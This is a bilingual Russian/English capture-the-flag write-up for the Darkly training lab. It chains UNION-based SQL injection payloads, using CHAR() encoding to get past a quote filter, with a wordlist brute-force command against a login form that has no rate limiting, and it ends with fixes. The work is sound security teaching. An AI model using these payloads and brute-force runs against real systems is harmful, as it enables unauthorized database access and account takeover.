# SQL Injection + Brute Force (No Rate Limiting)

> **Тип уязвимости / Vulnerability Type:** SQL Injection + Missing Brute-Force Protection  
> **Уровень сложности / Difficulty:** Beginner  
> **Платформа / Platform:** Darkly (учебный проект / educational lab)

---

## 🇷🇺 Русская версия

### Что произошло — общая картина

Эта задача комбинирует две уязвимости. Сначала через SQL-инъекцию мы обнаруживаем скрытую базу данных `Member_Brute_Force` с таблицей `db_default` — это подтверждает что существует пользователь `admin`. Затем через форму логина без какой-либо защиты от перебора прогоняем словарь паролей и находим правильный.

---

### Часть 1 — SQL-инъекция: разведка базы данных

#### Шаг 1 — Найти все схемы базы данных

Идём на `?page=member` и вводим в поле поиска:
```
1 AND 1=1 UNION SELECT 1, table_schema FROM information_schema.tables
```

**Что такое `table_schema`?**

В MySQL/MariaDB `table_schema` — это имя базы данных (схемы) которой принадлежит таблица. В `information_schema.tables` хранится список всех таблиц во всех базах данных на сервере, с указанием к какой схеме каждая принадлежит.

В результате видим несколько стандартных схем (`information_schema`, `mysql`) и одну нестандартную: `Member_Brute_Force`. Название говорит само за себя — это целевая база данных.

---

#### Шаг 2 — Найти таблицы в схеме `Member_Brute_Force`

Обычный запрос со строкой в `WHERE` не работает — кавычки фильтруются:
```sql
-- Не сработает:
WHERE table_schema='Member_Brute_Force'
```

Используем `CHAR()` — функцию MySQL которая собирает строку из ASCII-кодов символов:

```
1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables
WHERE table_schema=CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
```

**Что такое `CHAR()` и почему он обходит фильтр?**

`CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)` — это `Member_Brute_Force` в ASCII-кодах. MySQL вычисляет строку из чисел во время выполнения запроса. Фильтр на уровне приложения блокирует одинарные кавычки (`'`) в пользовательском вводе — но числа он не трогает. Итог тот же, фильтр обойдён.

Как получить CHAR-коды для любой строки:
```bash
echo -n "Member_Brute_Force" | python3 -c "import sys; print(','.join(str(b) for b in sys.stdin.buffer.read()))"
```

Результат: таблица `db_default`.

---

#### Шаг 3 — Найти колонки в `db_default`

```
1 AND 1=1 UNION SELECT column_name, 2 FROM information_schema.columns
WHERE table_schema=CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
AND table_name=CHAR(100,98,95,100,101,102,97,117,108,116)
```

`CHAR(100,98,95,100,101,102,97,117,108,116)` = `db_default`

Видим колонки с именами пользователя и паролем. Это подтверждает: пользователь `admin` существует, а его пароль хранится в этой базе. Теперь знаем цель — переходим к брутфорсу.

**Зачем вообще делать Part 1 если можно сразу брутить?**

В реальной атаке мы не знаем заранее что пользователь называется `admin` и что форма входа вообще уязвима к брутфорсу. SQL-инъекция даёт нам карту — мы видим структуру БД, подтверждаем существование пользователя, и только потом целенаправленно атакуем логин.

---

### Часть 2 — Брутфорс: перебор паролей

#### Почему форма входа уязвима к брутфорсу?

На странице `?page=signin` нет никакой защиты:

- Нет **rate limiting** — можно делать тысячи запросов в секунду
- Нет **блокировки аккаунта** после N неудачных попыток
- Нет **CAPTCHA** — запросы можно автоматизировать
- Нет **задержки** между попытками

Это означает что мы можем прогнать весь словарь паролей автоматически — без каких-либо препятствий.

#### Запуск скрипта

В папке breach лежит словарь `10k-most-common.txt` и скрипт `bruteforce.py`:

```bash
python3 bruteforce.py \
    -u "http://localhost:8080/index.php" \
    -n "admin" \
    -w "10k-most-common.txt" \
    -m "flag"
```

Скрипт перебирает пароли из словаря по одному, отправляет GET-запрос на форму входа, и ищет слово `flag` в ответе сервера. Когда пароль подходит — сервер возвращает страницу с флагом.

---

### Логика атаки — цепочка

```
SQL-инъекция на ?page=member
    ↓  UNION SELECT раскрывает схему Member_Brute_Force
    ↓  CHAR() обходит фильтр кавычек
    ↓  находим таблицу db_default и колонки с учётными данными
Подтверждаем: существует пользователь admin
    ↓  форма ?page=signin без rate limiting и блокировки
Запускаем bruteforce.py со словарём 10k-most-common.txt
    ↓  скрипт перебирает пароли автоматически
Правильный пароль найден → сервер возвращает флаг
    ↓
FLAG
```

---

### Как исправить

| Проблема | Решение |
|----------|---------|
| SQL-инъекция в поле поиска | Prepared statements для всех SQL-запросов |
| Кавычки фильтруются но `CHAR()` не блокируется | Параметризованные запросы вместо фильтрации символов |
| Нет rate limiting на логине | Ограничить количество попыток с одного IP в единицу времени |
| Нет блокировки аккаунта | Блокировать аккаунт после 5–10 неудачных попыток |
| Нет CAPTCHA | Добавить CAPTCHA после нескольких неудачных попыток |
| Слабый пароль в словаре | Требовать сложные пароли + bcrypt/argon2 для хранения |

---
---

## 🇬🇧 English Version

### Overview — What Happened

This challenge combines two vulnerabilities. First, through SQL injection we discover a hidden database `Member_Brute_Force` with a table `db_default` — confirming that an `admin` user exists. Then through a login form with no brute-force protection, we run a password wordlist and find the correct credentials.

---

### Part 1 — SQL Injection: Database Reconnaissance

#### Step 1 — Find All Database Schemas

Go to `?page=member` and enter in the search field:
```
1 AND 1=1 UNION SELECT 1, table_schema FROM information_schema.tables
```

**What is `table_schema`?**

In MySQL/MariaDB, `table_schema` is the name of the database (schema) that owns a table. `information_schema.tables` stores a list of all tables across all databases on the server, along with which schema each belongs to.

In the results we see several standard schemas (`information_schema`, `mysql`) and one non-standard one: `Member_Brute_Force`. The name speaks for itself — this is the target database.

---

#### Step 2 — Find Tables in the `Member_Brute_Force` Schema

A regular query with a string in `WHERE` doesn't work — quotes are filtered:
```sql
-- Won't work:
WHERE table_schema='Member_Brute_Force'
```

We use `CHAR()` — a MySQL function that constructs a string from ASCII character codes:

```
1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables
WHERE table_schema=CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
```

**What is `CHAR()` and why does it bypass the filter?**

`CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)` is `Member_Brute_Force` expressed as ASCII codes. MySQL computes the string from the numbers at query execution time. The application-level filter blocks single quotes (`'`) in user input — but it leaves numbers untouched. The result is the same, the filter is bypassed.

How to get CHAR codes for any string:
```bash
echo -n "Member_Brute_Force" | python3 -c "import sys; print(','.join(str(b) for b in sys.stdin.buffer.read()))"
```

Result: table `db_default`.

---

#### Step 3 — Find Columns in `db_default`

```
1 AND 1=1 UNION SELECT column_name, 2 FROM information_schema.columns
WHERE table_schema=CHAR(77,101,109,98,101,114,95,66,114,117,116,101,95,70,111,114,99,101)
AND table_name=CHAR(100,98,95,100,101,102,97,117,108,116)
```

`CHAR(100,98,95,100,101,102,97,117,108,116)` = `db_default`

We see columns for username and password. This confirms: user `admin` exists, and their password is stored in this database. We have our target — time to brute-force.

**Why do Part 1 at all if we can just brute-force directly?**

In a real attack we don't know in advance that the user is called `admin` or that the login form is vulnerable to brute-force. SQL injection gives us a map — we see the database structure, confirm the user exists, and only then attack the login form with a clear target.

---

### Part 2 — Brute Force: Password Enumeration

#### Why Is the Login Form Vulnerable to Brute Force?

The `?page=signin` page has no protection whatsoever:

- No **rate limiting** — thousands of requests per second are possible
- No **account lockout** after N failed attempts
- No **CAPTCHA** — requests can be fully automated
- No **delay** between attempts

This means we can run the entire password wordlist automatically — with no obstacles.

#### Running the Script

The breach folder contains the wordlist `10k-most-common.txt` and the script `bruteforce.py`:

```bash
python3 bruteforce.py \
    -u "http://localhost:8080/index.php" \
    -n "admin" \
    -w "10k-most-common.txt" \
    -m "flag"
```

The script tries passwords from the wordlist one by one, sends a GET request to the login form, and searches for the word `flag` in the server response. When the correct password is found — the server returns a page containing the flag.

---

### Attack Chain Summary

```
SQL injection on ?page=member
    ↓  UNION SELECT reveals the Member_Brute_Force schema
    ↓  CHAR() bypasses the quote filter
    ↓  we find table db_default and credential columns
We confirm: user admin exists
    ↓  ?page=signin has no rate limiting or lockout
We run bruteforce.py with the 10k-most-common.txt wordlist
    ↓  script automatically cycles through passwords
Correct password found → server returns the flag
    ↓
FLAG
```

---

### How to Fix

| Problem | Fix |
|---------|-----|
| SQL injection in search field | Prepared statements for all SQL queries |
| Quotes filtered but `CHAR()` not blocked | Parameterized queries instead of character filtering |
| No rate limiting on login | Limit the number of attempts per IP per time window |
| No account lockout | Lock the account after 5–10 failed attempts |
| No CAPTCHA | Add CAPTCHA after several failed attempts |
| Weak password in the wordlist | Enforce strong passwords + bcrypt/argon2 for storage |

---
